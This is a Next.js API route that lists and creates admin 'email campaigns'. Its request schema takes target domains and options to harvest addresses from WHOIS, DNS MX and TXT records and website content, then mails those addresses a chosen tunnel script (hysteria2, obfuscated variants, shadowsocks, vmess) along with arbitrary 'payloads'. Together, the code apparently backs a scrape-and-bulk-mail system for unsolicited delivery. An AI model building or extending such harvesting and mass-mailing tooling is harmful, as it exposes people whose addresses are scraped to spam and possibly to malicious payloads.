import { NextResponse, type NextRequest } from "next/server"
import { verifyAdmin, toErrorResponse } from "@/lib/auth/admin"
import { createEmailCampaign, executeCampaign, getCampaignStats } from "@/lib/mailer/enhanced-mailer"
import { prisma } from "@/lib/db"
import { z } from "zod"

const CreateCampaignSchema = z.object({
  name: z.string().min(1),
  description: z.string().optional(),
  provider: z.enum(['smtp', 'resend', 'mysmtp']),
  tunnelScriptType: z.enum(['hysteria2', 'hysteria2-obfs', 'multi-hop', 'shadowsocks', 'vmess']),
  nodeId: z.string().optional(),
  targetDomains: z.array(z.string().min(1)).min(1),
  emailHarvestOptions: z.object({
    includeWhois: z.boolean().optional(),
    includeDnsMx: z.boolean().optional(),
    includeWebsiteContent: z.boolean().optional(),
    includeDnsTxt: z.boolean().optional(),
    maxEmailsPerSource: z.number().optional(),
    validateEmails: z.boolean().optional(),
  }).optional(),
  minEmailConfidence: z.enum(['high', 'medium', 'low']).optional(),
  customSubject: z.string().optional(),
  customMessage: z.string().optional(),
  scheduledFor: z.string().datetime().optional(),
  tunnelConfig: z.string().optional(),
  payloads: z.array(z.any()).optional(),
})

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

// GET - List all campaigns
export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)

    const campaigns = await prisma.emailCampaign.findMany({
      orderBy: { createdAt: 'desc' },
      take: 50
    })

    return NextResponse.json({
      success: true,
      campaigns: campaigns.map(c => ({
        id: c.id,
        name: c.name,
        description: c.description,
        status: c.status,
        provider: c.provider,
        tunnelScriptType: c.tunnelScriptType,
        totalRecipients: c.totalRecipients,
        sentCount: c.sentCount,
        failedCount: c.failedCount,
        scheduledFor: c.scheduledFor,
        createdAt: c.createdAt,
        updatedAt: c.updatedAt
      }))
    })
  } catch (err) {
    return toErrorResponse(err)
  }
}

// POST - Create new campaign
export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)

    const body = await req.json()
    const validated = CreateCampaignSchema.parse(body)

    const campaign = await createEmailCampaign({
      ...validated,
      scheduledFor: validated.scheduledFor ? new Date(validated.scheduledFor) : undefined
    })

    return NextResponse.json({
      success: true,
      campaign: {
        id: campaign.id,
        name: campaign.name,
        status: campaign.status,
        totalRecipients: campaign.totalRecipients,
        targetDomains: campaign.targetDomains,
        harvestedEmailsCount: (campaign.harvestedEmails as any[]).length,
        selectedEmailsCount: (campaign.selectedEmails as any[]).length
      }
    })
  } catch (err) {
    if (err instanceof z.ZodError) {
      return NextResponse.json({ error: "Invalid request body", details: err.issues }, { status: 400 })
    }
    return toErrorResponse(err)
  }
}